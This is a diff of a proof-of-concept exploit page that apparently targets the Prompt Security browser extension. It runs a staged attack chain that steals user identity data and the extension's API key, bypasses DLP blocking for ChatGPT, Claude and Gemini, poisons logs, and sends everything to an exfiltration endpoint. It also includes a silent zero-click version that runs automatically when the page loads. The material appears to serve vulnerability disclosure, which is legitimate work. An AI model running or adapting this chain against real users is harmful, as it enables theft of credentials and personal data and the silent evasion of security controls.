-        addResult("Tenant API Config (Finding 2)", collected.tenantConfig, true);
+    // ── STAGE 5
+    stageHeader("STAGE 5 — LOG INJECTION (Finding 1: addLog + saveLogs)");
+    if (C.logs) {
+        addRow("Log Stream Poisoning", C.logs.logInjection, "high");
+        addRow("Log File Download", C.logs.logDownload, "high");
     }
 
-    if (collected.overlaySettings && !collected.overlaySettings.error) {
-        addResult("Overlay Settings (Finding 2)", collected.overlaySettings, true);
+    // ── AI Policy Map
+    stageHeader("AI SERVICE MONITORING MAP (Finding 1: callShouldInspectChat)");
+    if (C.aiPolicy) {
+        for (const [domain, info] of Object.entries(C.aiPolicy)) {
+            addRow(domain, info.monitored ? "MONITORED" : "not monitored", info.monitored ? "high" : "ok");
+        }
     }
 
-    if (Object.keys(collected.aiPolicyMap).length > 0) {
-        addResult("AI Service Monitoring Map (Finding 1)", collected.aiPolicyMap, true);
-    }
-
-    if (collected.configFromBackend && !collected.configFromBackend.error) {
-        addResult("Backend Config (Finding 2)", collected.configFromBackend, true);
+    // ── STAGE 6
+    stageHeader("STAGE 6 — BACKEND API WEAPONIZATION (stolen API key)");
+    if (C.weaponized && !C.weaponized.error) {
+        addRow("Impact", "Stolen API key allows impersonating the extension against the PS backend", "crit");
+        addRow("Heartbeat (full org config dump)", C.weaponized.heartbeat_full_config, "crit");
+        addRow("Explore API (domain classification)", C.weaponized.explore_domain, "high");
+        addRow("Inject Block Log", C.weaponized.inject_block_log, "high");
+        addRow("Inject System Log", C.weaponized.inject_system_log, "high");
+        addRow("Probe Protect API", C.weaponized.probe_protect_api, "high");
+    } else {
+        addRow("Backend Weaponization", C.weaponized?.error || "API key MDM-managed — curl commands require the key from a non-managed deployment or from another exfil path", "ok");
     }
 
     panel.classList.add("active");
 }
 
-// ── MAIN EXPLOIT CHAIN ──────────────────────────────────────────────
+// ═══════════════════ MAIN EXPLOIT CHAIN ═════════════════════════════
+
 async function runExploit() {
-    setStatus("[1/6] Detecting extension...");
+    setLoading("Stage 1: Detecting extension...");
+    setStatus("[1/6] Recon...");
+    await new Promise(r => setTimeout(r, 1200));
 
-    // Step 1: Detect extension via DOM fingerprint
-    // The content script sets document.documentElement.dataset.psScriptExecuted = "true"
-    // and injects <script id="ps_script"> with config data attributes
-    await new Promise(r => setTimeout(r, 1500)); // wait for content script injection
-
-    const detected = document.documentElement.dataset.psScriptExecuted === "true";
-    collected.extensionDetected = detected;
-
-    if (!detected) {
-        setStatus("Extension not detected on this browser. PoC requires Prompt Security extension.");
+    // ── STAGE 1
+    C.recon = stage1_recon();
+    if (!C.recon.detected) {
         document.getElementById("loadingOverlay").classList.remove("active");
-
-        // Still show results panel with detection failure
-        const container = document.getElementById("resultsContainer");
-        const panel = document.getElementById("resultsPanel");
-        const div = document.createElement("div");
-        div.className = "result-item";
-        div.innerHTML = '<span class="label">Status:</span> Prompt Security extension NOT detected. Install the extension and revisit this page.';
-        container.appendChild(div);
-        panel.classList.add("active");
+        const el = document.getElementById("resultsContainer");
+        el.innerHTML = '<div class="result-item"><span class="label">Status:</span> Prompt Security extension NOT detected.</div>';
+        document.getElementById("resultsPanel").classList.add("active");
         return;
     }
 
-    // Step 2: Extract policy config from DOM (Finding 3)
-    setStatus("[2/7] Extracting DLP policy config from DOM...");
-    extractPolicyConfig();
-    await new Promise(r => setTimeout(r, 500));
+    // ── STAGE 2
+    setLoading("Stage 2: Stealing user identity...");
+    setStatus("[2/6] Identity theft...");
+    C.identity = await stage2_identity();
 
-    // Step 3: THE MONEY SHOT — getSiteActionConfig via content script relay (Finding 2)
-    // Returns: userInfo.email, profileEmail, machineName, userUUID, identitySource,
-    //          plus full org policy (bypass settings, ignored domains, domain actions)
-    setStatus("[3/7] Extracting user identity via getSiteActionConfig relay...");
-    collected.siteActionConfig = await exfilUserInfoViaSiteConfig();
+    // ── STAGE 3
+    setLoading("Stage 3: Stealing API key...");
+    setStatus("[3/6] API key theft...");
+    C.apiKey = await stage3_apiKey();
 
-    // Step 4: Also try callProtectApi via onMessageExternal (Finding 1)
-    setStatus("[4/7] Triggering callProtectApi via external message API...");
-    collected.userIdentity = await exfilUserIdentity();
+    // ── STAGE 4
+    setLoading("Stage 4: Bypassing DLP protections...");
+    setStatus("[4/6] DLP bypass...");
+    C.bypass = await stage4_bypass();
 
-    // Step 5: Exfiltrate tenant API config via relay (Finding 2)
-    setStatus("[5/7] Extracting tenant config + overlay settings...");
-    const [tenantCfg, overlayCfg] = await Promise.all([
-        exfilTenantConfig(),
-        exfilOverlaySettings()
+    // ── STAGE 5
+    setLoading("Stage 5: Injecting logs + triggering download...");
+    setStatus("[5/6] Log injection...");
+    C.logs = await stage5_logInject();
+
+    // ── AI Policy probe (parallel with stage 6)
+    setLoading("Stage 6: Probing AI policy + weaponizing API key...");
+    setStatus("[6/6] Weaponize...");
+    const [aiPolicy] = await Promise.all([
+        probeAiPolicy(),
     ]);
-    collected.tenantConfig = tenantCfg;
-    collected.overlaySettings = overlayCfg;
+    C.aiPolicy = aiPolicy;
 
-    // Step 6: Probe AI monitoring policy (Finding 1)
-    setStatus("[6/7] Probing organization AI monitoring policy...");
-    const aiDomains = [
-        "chatgpt.com", "claude.ai", "gemini.google.com",
-        "copilot.microsoft.com", "grok.com", "perplexity.ai",
-        "chat.deepseek.com", "chat.mistral.ai"
-    ];
-    const policyResults = await Promise.all(aiDomains.map(d => probeAiPolicy(d)));
-    for (const r of policyResults) {
-        if (r) collected.aiPolicyMap[r.domain] = { monitored: r.monitored, raw: r.rawResponse };
-    }
+    // ── STAGE 6
+    const email = C.identity?.userInfo?.email;
+    const apiDomain = C.apiKey?.apiDomain || C.apiKey?.isManagedApiDomain;
+    const apiKey = C.apiKey?.apiKey;
+    C.weaponized = stage6_weaponize(
+        typeof apiDomain === "string" ? apiDomain : null,
+        apiKey,
+        email
+    );
 
-    // Step 6b: Backend config
-    collected.configFromBackend = await exfilBackendConfig();
+    // ── EXFILTRATE
+    C.timestamp = new Date().toISOString();
+    C.userAgent = navigator.userAgent;
+    exfil(C);
 
-    // Step 7: Exfiltrate everything to attacker webhook
-    setStatus("[7/7] Exfiltrating all data to webhook...");
-    sendToWebhook(collected);
-
-    await new Promise(r => setTimeout(r, 500));
-    setStatus("Exploit chain complete. Data exfiltrated.");
-
-    // Show results to demonstrate impact
+    setStatus("Attack chain complete — 6 stages executed.");
     document.getElementById("loadingOverlay").classList.remove("active");
-    showResults();
+    display();
 }
 
-// ── TRIGGER ─────────────────────────────────────────────────────────
 function handleGetStarted() {
     document.getElementById("loadingOverlay").classList.add("active");
-    // Small delay to show loading animation, then run exploit
-    setTimeout(runExploit, 800);
+    setTimeout(runExploit, 600);
 }
 
-// Also auto-run silently on page load (the real attack vector —
-// no click needed, but we keep the button for demo purposes)
-window.addEventListener("DOMContentLoaded", function() {
-    // Silent auto-run after a brief delay for content script to inject
-    setTimeout(function() {
-        // Only auto-run the data collection, don't show UI
-        // The button click shows the full UI demo
-        if (document.documentElement.dataset.psScriptExecuted === "true") {
-            extractPolicyConfig();
-            // Silently collect and exfil in background
-            Promise.all([
-                exfilUserInfoViaSiteConfig(),
-                exfilUserIdentity(),
-                exfilTenantConfig(),
-                exfilOverlaySettings(),
-                Promise.all(["chatgpt.com","claude.ai","gemini.google.com","copilot.microsoft.com",
-                             "grok.com","perplexity.ai","chat.deepseek.com","chat.mistral.ai"]
-                    .map(d => probeAiPolicy(d)))
-            ]).then(([siteAction, identity, tenant, overlay, policies]) => {
-                const silentData = {
-                    mode: "silent_auto",
-                    timestamp: new Date().toISOString(),
-                    userAgent: navigator.userAgent,
-                    extensionId: collected.extensionId,
-                    policyConfig: collected.policyConfig,
-                    userEmail: siteAction?.userInfo?.email || null,
-                    profileEmail: siteAction?.userInfo?.profileEmail || null,
-                    machineName: siteAction?.userInfo?.machineName || null,
-                    userUUID: siteAction?.userInfo?.userUUID || null,
-                    identitySource: siteAction?.userInfo?.identitySource || null,
-                    siteActionConfig: siteAction,
-                    userIdentity: identity,
-                    tenantConfig: tenant,
-                    overlaySettings: overlay,
-                    aiPolicyMap: {}
-                };
-                for (const r of policies) {
-                    if (r) silentData.aiPolicyMap[r.domain] = { monitored: r.monitored };
-                }
-                sendToWebhook(silentData);
-            }).catch(() => {});
+// ═══════════════════ SILENT AUTO-RUN (zero-click) ═══════════════════
+window.addEventListener("DOMContentLoaded", () => {
+    setTimeout(async () => {
+        if (document.documentElement.dataset.psScriptExecuted !== "true") return;
+
+        const recon = stage1_recon();
+        const [identity, apiKey, aiPolicy] = await Promise.all([
+            stage2_identity(),
+            stage3_apiKey(),
+            probeAiPolicy()
+        ]);
+
+        // Bypass AI chat blocking silently
+        for (const d of ["chatgpt.com","claude.ai","gemini.google.com"]) {
+            relay({ type: "aiChatBlockMessageBypass", domain: d, ctx: { flowTraceId: crypto.randomUUID() } });
         }
+
+        // Inject log entries silently
+        extMsg({ message: "addLog", location: "silent-exfil", log: `[ATTACKER] Silent beacon from ${navigator.userAgent} at ${new Date().toISOString()}`, ctx: { flowTraceId: crypto.randomUUID() } });
+
+        const email = identity?.userInfo?.email;
+        exfil({
+            mode: "silent_zero_click",
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            // Stage 1
+            extensionId: recon.extensionId,
+            policyFlags: recon.policyFlags,
+            // Stage 2 — identity
+            userEmail: email || null,
+            profileEmail: identity?.userInfo?.profileEmail || null,
+            machineName: identity?.userInfo?.machineName || null,
+            userUUID: identity?.userInfo?.userUUID || null,
+            identitySource: identity?.userInfo?.identitySource || null,
+            workProfileDomain: identity?.workProfileDomain || null,
+            // Stage 3 — API key
+            apiKey: apiKey?.apiKey || null,
+            apiDomain: apiKey?.apiDomain || null,
+            isManagedKey: apiKey?.isManagedApiKey || null,
+            // Stage 4 — bypass confirmed
+            bypassedDomains: ["chatgpt.com","claude.ai","gemini.google.com"],
+            // AI policy map
+            aiPolicyMap: Object.fromEntries(
+                Object.entries(aiPolicy).map(([k,v]) => [k, v.monitored])
+            ),
+            // Full raw responses for analysis
+            _raw: { identity, apiKey }
+        });
     }, 2000);
 });
 </script>
-
 </body>
 </html>
